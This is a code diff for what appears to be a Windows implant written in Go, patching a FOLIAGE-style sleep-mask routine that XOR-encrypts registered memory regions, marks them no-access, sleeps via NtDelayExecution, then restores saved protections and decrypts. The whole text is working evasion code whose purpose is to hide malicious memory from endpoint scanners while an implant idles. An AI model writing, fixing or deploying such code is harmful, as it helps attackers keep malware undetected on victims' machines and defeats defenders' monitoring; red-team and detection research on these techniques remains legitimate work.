@@ -183,14 +183,19 @@ func sleepMaskEkko(durationMs uint32) {
 // separate thread — the same isolation property that FOLIAGE achieves with
 // NtCreateThreadEx + NtQueueApcThread in C.
 func sleepMaskFoliage(durationMs uint32) {
+	type savedProt struct {
+		base uintptr
+		size uintptr
+		prot uint32
+	}
 	done := make(chan struct{})
 	go func() {
-		// Encrypt registered regions
 		maskRegionsMu.Lock()
+		// Encrypt and snapshot original protections before setting NOACCESS
+		saved := make([]savedProt, 0, len(maskRegions))
 		for _, r := range maskRegions {
 			xorMaskRegion(r.base, r.size)
 		}
-		// Set PAGE_NOACCESS on all regions
 		for _, r := range maskRegions {
 			a, sz := r.base, r.size
 			var old uint32
@@ -201,6 +206,7 @@ func sleepMaskFoliage(durationMs uint32) {
 				uintptr(windows.PAGE_NOACCESS),
 				uintptr(unsafe.Pointer(&old)),
 			)
+			saved = append(saved, savedProt{r.base, r.size, old})
 		}
 		maskRegionsMu.Unlock()
 
@@ -208,19 +214,19 @@ func sleepMaskFoliage(durationMs uint32) {
 		delay := -int64(durationMs) * 10000
 		procNtDelayExecution.Call(0, uintptr(unsafe.Pointer(&delay)))
 
-		// Restore and decrypt
+		// Restore original protections then decrypt
 		maskRegionsMu.Lock()
-		for _, r := range maskRegions {
-			a, sz := r.base, r.size
+		for _, s := range saved {
+			a, sz := s.base, s.size
 			var old uint32
 			procNtProtectVirtualMemory.Call(
 				uintptr(windows.CurrentProcess()),
 				uintptr(unsafe.Pointer(&a)),
 				uintptr(unsafe.Pointer(&sz)),
-				uintptr(windows.PAGE_EXECUTE_READ),
+				uintptr(s.prot),
 				uintptr(unsafe.Pointer(&old)),
 			)
-			xorMaskRegion(r.base, r.size)
+			xorMaskRegion(s.base, s.size)
 		}
 		maskRegionsMu.Unlock()
 		close(done)
